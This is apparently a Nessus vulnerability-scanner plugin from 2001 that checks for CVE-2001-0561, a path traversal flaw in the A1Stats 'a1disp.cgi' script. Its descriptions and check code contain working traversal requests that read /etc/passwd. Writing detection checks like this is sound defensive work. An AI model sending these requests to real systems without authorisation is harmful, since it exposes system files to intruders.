#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10669);
 script_bugtraq_id(2705);
 script_cve_id("CVE-2001-0561");
 script_version("$Revision: 1.19 $");
 
 name["english"] = "A1Stats Traversal";
 name["francais"] = "A1Stats";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'a1disp.cgi' CGI script was found on 
 this system. The script allows an attacker to view any file 
 on the target computer by requesting :

GET /cgi-bin/a1disp*.cgi?/../../../../etc/passwd

Solution : Delete the 'a1disp.cgi' script.

Risk factor : High";

 desc["francais"] = "Le CGI 'a1disp' permet à un 
pirate de lire n'importe quel fichier sur la machine cible
au travers de la commande :

GET /cgi-bin/a1disp*.cgi?/../../../../etc/passwd

Facteur de risque : Elevé

Solution : Supprimez cette page";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks if A1Stats reads any file";
 summary["francais"] = "Détermine si a1stats lit n'importe quel fichier";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

function check(str)
{
  req = http_get(port:port, item:str);
  r = http_keepalive_send_recv(port:port, data:req);
  if( r == NULL ) exit(0);
  if(egrep(pattern:".*root:.*:0:[01]:", string:r))return(1);
  return(0);
}

port = get_http_port(default:80);


if(get_port_state(port))
{
  foreach dir (cgi_dirs())
  {
  req = string(dir, "/a1disp3.cgi?/../../../../../../etc/passwd");
  if(check(str:req)){security_hole(port);exit(0);}
  req = string(dir, "/a1stats/a1disp3.cgi?/../../../../../../etc/passwd");
  if(check(str:req)){security_hole(port);exit(0);}
  }
}

